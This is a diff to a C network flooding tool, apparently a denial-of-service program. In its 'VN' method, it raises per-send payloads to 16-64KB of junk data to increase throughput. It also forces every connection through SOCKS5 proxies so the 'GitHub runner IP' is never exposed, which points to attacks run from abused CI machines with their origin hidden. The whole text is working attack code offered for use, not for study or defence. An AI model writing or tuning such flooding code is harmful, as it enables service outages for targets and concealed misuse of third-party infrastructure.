@@ -853,10 +853,10 @@ void handle_connection_event(int epoll_fd, struct epoll_event *ev, int thread_id
             
             else if (args.is_vn_tcp) {
                 // VN Raw Hex Blast — no SSH protocol, just raw data through SOCKS5 proxy
-                // MTU-safe: 1000-1440 bytes per send, maximize throughput
+                // Large chunks through SOCKS5 tunnel — proxy handles MTU segmentation
                 int ret = 0;
                 while(1) {
-                    int s = 1000 + (fast_rand() % 440);  // 1000-1440 bytes
+                    int s = 16384 + (fast_rand() % 49152);  // 16KB-64KB per send
                     int offset = fast_rand() % (BUFFER_POOL_SIZE - s);
                     ret = send(conn->fd, global_buffer_pool + offset, s, MSG_NOSIGNAL);
                     if(ret <= 0) { if(errno == EAGAIN || errno == EWOULDBLOCK) conn->writable = 0; break; }
@@ -1056,9 +1056,12 @@ int spawn_connection(int epoll_fd, int thread_id) {
     Proxy *p = NULL;
     int is_udp = 0;
     if (args.is_vn_tcp) {
-        // VN method: prefer proxy, fallback to direct connect
+        // VN method: MUST use proxy 100% — never direct connect with GitHub runner IP
         p = select_alive_proxy();
-        // p = NULL → will connect directly to target
+        if (!p) {
+            close(fd);
+            return 0;  // No proxy available, don't waste connection on direct
+        }
     } else if (args.is_hybrid_v15 && proxy_count > 0) {
         p = select_alive_proxy();
         if ((fast_rand() % 100) < 40) {
@@ -2506,8 +2509,8 @@ void *worker_thread(void *arg) {
                     setsockopt(curr->fd, IPPROTO_TCP, TCP_CORK, &cork, sizeof(cork));
                     int ret;
                     int batch_count = 0;
-                    while (batch_count < 64) {
-                        int s = 1000 + (fast_rand() % 440);  // 1000-1440 bytes MTU-safe
+                    while (batch_count < 32) {
+                        int s = 32768 + (fast_rand() % 32768);  // 32KB-64KB through SOCKS5 tunnel
                         int offset = fast_rand() % (BUFFER_POOL_SIZE - s);
                         ret = send(curr->fd, global_buffer_pool + offset, s, MSG_NOSIGNAL | MSG_MORE);
                         if (ret <= 0) {
